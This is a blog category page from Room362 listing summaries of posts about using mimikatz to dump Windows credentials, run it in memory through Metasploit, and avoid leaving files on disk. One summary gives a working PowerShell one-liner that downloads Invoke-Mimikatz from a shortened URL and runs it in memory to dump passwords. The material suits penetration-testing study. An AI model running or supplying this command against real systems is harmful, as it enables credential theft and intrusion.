<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <title>
    Mimikatz // Room362
  </title>

  <link href="http://gmpg.org/xfn/11" rel="profile">
<meta http-equiv="content-type" content="text/html; charset=utf-8">


<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="generator" content="Hugo 0.17" />

  <meta property="og:title" content="Mimikatz" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="en_US" />
<meta property="og:url" content="https://room362.com/categories/mimikatz/" />


  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
  
  
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
  
  

  <link rel="stylesheet" href="https://room362.com//css/redlounge.css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.png">

  
  <link href="https://room362.com/categories/mimikatz/index.xml" rel="alternate" type="application/rss+xml" title="Room362" />

    
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>


  

  

  

  
</head>

<body>
	<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
  <div class="header">
    

	
	  <img src="/images/headshot_small.png" class="sidebarphoto">
	

    <h1 class="brand-title">Room362</h1>
    <h2 class="brand-tagline">Blatherings of a security addict</h2>

    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://room362.com/">Home</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/brandon/">Brandon</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/start/">Start in Infosec</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/projects/">Projects</a></li><br>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="http://pwnwiki.io">PwnWiki</a></li><br>
        
      </ul>
    </nav>

    
    <div class="social-buttons">
      
        
        <a href="/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
        
      
        
        <a href="https://linkedin.com/in/mubix" target="_blank"><i class='fa fa-linkedin'></i></a>
        
      
        
        <a href="https://twitter.com/mubix" target="_blank"><i class='fa fa-twitter'></i></a>
        
      
      
    </div>
    
    <br>
    <h2 class="brand-tagline">Support Me</h2>
    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://paypal.me/mubix/10">Paypal Donation</a></li><br>
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://patreon.com/mubix">Patreon Subscription</a></li>
      </ul>
    </nav>

  </div>
</div>


    <div class="content pure-u-1 pure-u-md-3-4">
      <a name="top"></a>
      

      <div class="posts">
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/">Dumping a domain worth of passwords with mimikatz</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>5</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
					        <a class="post-category post-category-cli" href="https://room362.com//categories/cli">cli</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.
You can very easily use this script directly from an admin command prompt as so:
powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds&quot;  (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system.
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/">Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>7</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Mimikatz is now built into Metasploit&rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2013/2013-04-08-sessiondump-meterpreter-extension/">Sessiondump Meterpreter Extension</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>8</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Apr</span> <span class="post-date-year">2013</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.
Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:
            </article>
			<div class="read-more-link">
				<a href="/post/2013/2013-04-08-sessiondump-meterpreter-extension/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/">Completely In-memory Mimikatz with Metasploit</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>6</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Sep</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:
(yes I realize I&rsquo;m running this on disk &lsquo;wce32.exe&rsquo;, but it exhibits the same DLL drop when doing in-memory)
Now, don&rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&rsquo;s the best tool for the job.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/">Integration of Mimikatz into Metasploit Stage1</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>15</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
					        <a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2012/2012-04-26-phdays-in-moscow/">phDays in Moscow</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>26</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Apr</span> <span class="post-date-year">2012</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-mimikatz" href="https://room362.com//categories/mimikatz">mimikatz</a>
      					
					        <a class="post-category post-category-presentations" href="https://room362.com//categories/presentations">presentations</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	A friend of mine is presenting at phDays in Moscow at the end of May. If you are in the area, or can be, I would highly recommend you attend, and in particularly his talk.
His blog is here: http://blog.gentilkiwi.com/
And since a picture is worth a thousand words:
You should really go check out what he is going to present&hellip; just sayin&rsquo;
            </article>
			<div class="read-more-link">
				<a href="/post/2012/2012-04-26-phdays-in-moscow/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
      </div>

      <div class="footer">
	<hr class="thin" />
	<div class="pure-menu pure-menu-horizontal pure-menu-open">
		<ul class="footer-menu">
		
			<li><a href="/about">About</a></li>
		
			<li><a href="/post">Blog</a></li>
		
		</ul>
	</div>

	<p>&copy; 2016. All rights reserved.</p>
</div>
    </div>
  </div>
  
</body>
</html>
